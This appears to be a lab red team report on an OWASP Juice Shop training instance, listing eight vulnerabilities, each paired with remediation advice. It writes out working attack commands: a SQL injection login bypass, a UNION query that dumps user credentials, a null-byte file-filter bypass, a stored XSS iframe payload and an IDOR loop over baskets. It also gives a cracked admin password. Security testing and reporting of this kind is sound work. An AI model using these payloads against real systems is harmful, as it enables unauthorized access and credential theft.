# Red Team Mission Report
## OWASP Juice Shop — http://10.10.30.130:3000
## Mission ID: 2026-03-12-001

---

## Executive Summary

A full red team assessment was conducted against an OWASP Juice Shop instance at `http://10.10.30.130:3000`. The target is a deliberately vulnerable Node.js web application used for security training. Over the course of this mission, four critical vulnerabilities were confirmed and exploited, demonstrating a complete attack chain from unauthenticated access through full administrative compromise and mass credential exfiltration.

The most severe findings involve two instances of SQL injection — one enabling complete authentication bypass and one allowing the exfiltration of all 22 user credentials from the underlying SQLite database. A persistent Cross-Site Scripting vulnerability in the product review API provides a persistent foothold for session hijacking. Sensitive file disclosure via an open FTP directory and a Poison Null Byte bypass exposed a KeePass credential database, coupon codes, and application dependency manifests.

**Overall Risk Rating: CRITICAL**

---

## Scope and Rules of Engagement

| Parameter | Value |
|-----------|-------|
| Target IP | 10.10.30.130 |
| Target Port | 3000 |
| Target Application | OWASP Juice Shop v19.2.0-SNAPSHOT |
| Test Type | Gray-box (application visible, no source code) |
| Max Exploits | 4 |
| Out of Scope | DoS, persistent backdoors, data destruction, other systems, ransomware, social engineering |
| Allowed Attacks | enumeration, vulnerability_scanning, injection, fuzzing, exploitation, brute_force |

---

## Mission Timeline

| Timestamp | Event |
|-----------|-------|
| 2026-03-12T19:11:34Z | Mission started |
| 2026-03-12T19:14:22Z | Recon complete |
| 2026-03-12T19:17:45Z | Scan complete |
| 2026-03-12T19:42:30Z | Mission resumed |
| 2026-03-12T19:50:00Z | Enumeration complete |
| 2026-03-12T19:58:00Z | Exploitation complete — 4/4 exploits confirmed |
| 2026-03-12T20:05:00Z | Post-exploitation complete |
| 2026-03-12T20:10:00Z | Report generated |

---

## Findings Summary

| # | Vulnerability | OWASP Category | Severity | CVSS |
|---|---------------|---------------|----------|------|
| 1 | SQL Injection — Login Authentication Bypass | A03:2021 Injection | Critical | 9.8 |
| 2 | SQL Injection — UNION Credential Dump | A03:2021 Injection | Critical | 9.8 |
| 3 | Sensitive Data Exposure — Open FTP + Null Byte Bypass | A02:2021 / A05:2021 | High | 7.5 |
| 4 | Persisted XSS — Product Review API | A03:2021 Injection | High | 8.2 |
| 5 | Broken Access Control — IDOR on User Baskets | A01:2021 Broken Access Control | High | 7.5 |
| 6 | Security Misconfiguration — Unauthenticated Metrics | A05:2021 | Medium | 5.3 |
| 7 | Cryptographic Failure — Unsalted MD5 Password Hashing | A02:2021 | High | 7.5 |
| 8 | Sensitive Data in JWT Payload | A02:2021 | High | 7.1 |

---

## Detailed Findings

---

### FINDING 1 — SQL Injection: Login Authentication Bypass
**Severity:** Critical (CVSS 9.8)
**OWASP:** A03:2021 Injection
**CWE:** CWE-89

**Description:**
The `/rest/user/login` endpoint concatenates the `email` parameter directly into a SQL query. An unauthenticated attacker can inject SQL to bypass authentication entirely and log in as any user, including admin.

**Proof of Exploitation:**
```bash
curl -s -X POST http://10.10.30.130:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
```

**Response:**
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "umail": "admin@juice-sh.op"
  }
}
```

**Secondary Impact:** The JWT payload contained the admin password hash in plaintext (`0192023a7bbd73250516f069df18b500`), cracked to `admin123`.

**Remediation:**
- Use parameterized queries (Sequelize ORM supports this natively)
- Implement input validation on email field
- Do not include sensitive fields in JWT payload
- Use bcrypt/Argon2 for password hashing

---

### FINDING 2 — SQL Injection: UNION-Based Credential Dump
**Severity:** Critical (CVSS 9.8)
**OWASP:** A03:2021 Injection
**CWE:** CWE-89

**Description:**
The product search endpoint `/rest/products/search?q=` is vulnerable to UNION-based SQL injection. The `q` parameter is passed unsanitized to a SQLite LIKE query. An attacker can append a UNION SELECT to extract any table from the database.

**Proof of Exploitation:**
```bash
curl -s "http://10.10.30.130:3000/rest/products/search?q=test'))+UNION+SELECT+'1',email,password,'4','5','6','7','8','9'+FROM+Users--"
```

**Result:** All 22 user records returned with email and MD5 password hash. Admin credentials confirmed: `admin@juice-sh.op:admin123`.

**Remediation:**
- Parameterized queries mandatory
- Whitelist input characters for search fields
- Principle of least privilege — app DB user should not SELECT from Users table via product search

---

### FINDING 3 — Sensitive Data Exposure: Open FTP Directory + Null Byte Bypass
**Severity:** High (CVSS 7.5)
**OWASP:** A02:2021 Cryptographic Failures / A05:2021 Security Misconfiguration
**CWE:** CWE-22, CWE-200

**Description:**
The `/ftp/` path serves a directory listing with no authentication. Files including a KeePass credential database (`incident-support.kdbx`) and confidential documents are accessible. Files blocked by extension filter (`.bak`) are bypassed using the Poison Null Byte technique (`%2500`).

**Null Byte Bypass Proof:**
```bash
# Direct access: 403
curl "http://10.10.30.130:3000/ftp/coupons_2013.md.bak"

# Null byte bypass: 200
curl "http://10.10.30.130:3000/ftp/coupons_2013.md.bak%2500.md"
```

**Files Exfiltrated:**
- `incident-support.kdbx` — KeePass 2.x credential database (3246 bytes)
- `coupons_2013.md.bak` — 12 discount coupon codes
- `package.json.bak` — Full dependency manifest (confirms vulnerable `sanitize-html 1.4.2`)

**Remediation:**
- Disable directory listing
- Move sensitive files outside web root
- Fix null byte path canonicalization before extension checks
- Implement authentication on file downloads

---

### FINDING 4 — Persisted XSS: Product Review API
**Severity:** High (CVSS 8.2)
**OWASP:** A03:2021 Injection
**CWE:** CWE-79

**Description:**
The product review API (`PUT /rest/products/{id}/reviews`) accepts and persists HTML without sanitization. An authenticated attacker can store an `<iframe src="javascript:alert()">` payload that executes in the browser of any user viewing the affected product page.

**Proof of Exploitation:**
```bash
curl -s -X PUT http://10.10.30.130:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"message":"<iframe src=\"javascript:alert(`xss`)\">","author":"attacker@evil.com"}'
```

**Verification:** GET /rest/products/1/reviews returns `<iframe src="javascript:alert('xss')">` in the message field.

**Remediation:**
- Apply output encoding on all user-controlled fields rendered in HTML
- Implement strict CSP that prohibits `javascript:` URIs
- Upgrade `sanitize-html` from 1.4.2 to latest version; apply sanitization at API layer

---

### FINDING 5 — Broken Access Control: IDOR on User Baskets
**Severity:** High (CVSS 7.5)
**OWASP:** A01:2021 Broken Access Control
**CWE:** CWE-639

**Description:**
The basket endpoint `/rest/basket/{id}` does not enforce ownership. An admin-level JWT allows access to any user's basket by incrementing the ID parameter.

**Proof:**
```bash
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "Basket $i: HTTP %{http_code}\n" \
    http://10.10.30.130:3000/rest/basket/$i \
    -H "Authorization: Bearer $ADMIN_TOKEN"
done
# All return HTTP 200
```

**Remediation:**
- Enforce basket ownership at the API layer (only allow access to the authenticated user's own basket)
- Admin endpoints should still enforce object-level authorization

---

### FINDING 6 — Security Misconfiguration: Unauthenticated Prometheus Metrics
**Severity:** Medium (CVSS 5.3)
**OWASP:** A05:2021 Security Misconfiguration

**Description:**
The `/metrics` endpoint exposes Prometheus-format metrics without any authentication, including CPU usage, process uptime, file upload counts, and startup task durations.

**Remediation:**
- Restrict `/metrics` to internal networks or require authentication
- If metrics must be public, consider a separate internal-only metrics port

---

### FINDING 7 — Cryptographic Failure: Unsalted MD5 Password Hashing
**Severity:** High (CVSS 7.5)
**OWASP:** A02:2021 Cryptographic Failures
**CWE:** CWE-916

**Description:**
All 22 user passwords are stored as unsalted MD5 hashes. MD5 is a broken cryptographic function unsuitable for password storage, and unsalted hashes are immediately reversible via rainbow table lookup or simple dictionary attack.

**Evidence:** Admin hash `0192023a7bbd73250516f069df18b500` cracked to `admin123` in under 1 second locally.

**Remediation:**
- Replace MD5 with bcrypt (cost factor 12+) or Argon2id
- Implement unique per-user salts
- Force password reset after hash algorithm migration

---

### FINDING 8 — Sensitive Data in JWT Payload
**Severity:** High (CVSS 7.1)
**OWASP:** A02:2021 Cryptographic Failures

**Description:**
The JWT payload contains the full user object including the MD5 password hash, role, profile image path, and TOTP secret. JWTs are base64-encoded (not encrypted) and readable by any party with the token.

**Evidence:** JWT payload decoded shows `"password": "0192023a7bbd73250516f069df18b500"`.

**Remediation:**
- Include only minimal claims in JWT (user ID, role, expiration)
- Never include sensitive fields (password hash, secrets) in JWT payload

---

## Loot Inventory

| Item | Location | Status |
|------|----------|--------|
| Admin JWT token | exploit/exploit_01_sqli_login_bypass.md | Active |
| Admin plaintext password (admin123) | loot/credentials.md | Confirmed |
| 22 user MD5 hashes | loot/credentials.md | Exfiltrated |
| incident-support.kdbx | /tmp/incident-support.kdbx | Downloaded, not cracked |
| Coupon codes (12) | loot/credentials.md | Confirmed |
| JWT RSA public key | /encryptionkeys/jwt.pub | Available |
| Premium paywall key | loot/credentials.md | Confirmed |
| Application config | postex/postex_findings.md | Documented |

---

## OWASP Top 10 Coverage

| OWASP Category | Demonstrated By |
|---------------|-----------------|
| A01 Broken Access Control | IDOR on user baskets |
| A02 Cryptographic Failures | Unsalted MD5, sensitive data in JWT, open FTP |
| A03 Injection | SQLi login bypass, SQLi credential dump, Persisted XSS |
| A04 Insecure Design | Open directory listing, backup files in web root |
| A05 Security Misconfiguration | Unauthenticated metrics, CORS wildcard |

---

## Recommendations (Priority Order)

1. **CRITICAL** — Parameterize all SQL queries in login and search endpoints immediately
2. **CRITICAL** — Replace MD5 password hashing with bcrypt/Argon2 and force user password resets
3. **HIGH** — Remove `/ftp/` from web-accessible paths; disable directory listing
4. **HIGH** — Apply output encoding to all user-generated content rendered in HTML
5. **HIGH** — Implement object-level authorization on basket/order endpoints
6. **HIGH** — Remove sensitive fields from JWT payload; encrypt JWT if sensitive claims are required
7. **MEDIUM** — Restrict `/metrics` to authenticated or internal access only
8. **MEDIUM** — Upgrade `sanitize-html` from 1.4.2 to latest version
9. **LOW** — Remove `X-Recruiting` header from HTTP responses
10. **LOW** — Implement CORS policy with specific allowed origins rather than wildcard

---

*Report generated: 2026-03-12T20:10:00Z*
*Mission ID: 2026-03-12-001*
*Classification: LAB / TRAINING USE ONLY*
